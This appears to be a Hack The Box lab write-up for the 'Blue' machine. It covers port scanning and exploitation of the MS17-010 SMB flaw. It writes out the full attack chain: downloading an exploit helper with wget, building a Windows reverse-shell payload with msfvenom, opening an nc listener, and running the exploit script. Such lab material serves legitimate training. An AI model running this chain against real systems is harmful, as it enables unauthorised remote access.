# Blue 

**Links:** [1](https://www.hackthebox.com/machines/Blue)  [2](https://app.hackthebox.com/machines/Blue)

**Machine ip:** 10.10.10.40

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a8b31b09-f318-49b3-a8b6-0faa07b52c0d)



## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.40 -e tun0 > ports

sort -n -k4 ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.40 --open

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/541cf98d-1908-45af-a6ea-4bfc302fdf55)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1acc49b7-1b38-4c2f-8f43-2c7d42f91b00)


## Enumeration
```
nmap --script vuln 10.10.10.40
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/be27653c-bed5-41e6-bf76-9b531c32a044)


## Exploitation & Gaining Access & Privilege Escalation

### Method 1: [CVE-2017-0144](https://www.exploit-db.com/exploits/42315)
```
searchsploit ms17-010

searchsploit -m 42315

mv 42315.py ms17-010.py
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0ff3583a-8c7e-46f7-a6b0-27fbd1a5692b)

Modify username as **guest** in the below python exploit code:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/74f3513b-14eb-452e-98ba-2dd5bd2117da)

Uncomment two lines, update the exploit code with the reverse shell executable location and get the script to execute it:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7eb03635-3cf3-4bef-b318-aa69bb2263f0)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/521a14ec-bd35-4563-af1e-a7e350f62e53)

```
# On kali attack machine:
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py

msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.24 LPORT=4444 -o ms17-010.exe

nc -lnvp 4444

python2 ms17-010.py 10.10.10.40

# On the target machine:
whoami
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1dadd00f-e06d-4a7b-8a2d-b6a4c02286d0)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7b30f7bd-8ec0-4e8b-902b-78ed57b5660b)



# References & Alternatives
+ https://vvmlist.github.io/#blue
+ https://medium.com/@dw3113r/hack-the-box-blue-writeup-without-metasploit-1c6f7e3c586c
  + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/blue-writeup-w-o-metasploit
+ https://0xdf.gitlab.io/2021/05/11/htb-blue.html
+ 


## CVE Scripting
+ **CVE-2017-0144:** https://www.exploit-db.com/exploits/42315
+ **CVE-2017-0143:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143


## Tools
+ **mysmb.py:** https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
  + https://github.com/worawit/MS17-010


## Technical Knowledge
+ x


## Problems Solution
+ x


## For More
+ https://msrc.microsoft.com/blog/2017/05/customer-guidance-for-wannacrypt-attacks/
+ 
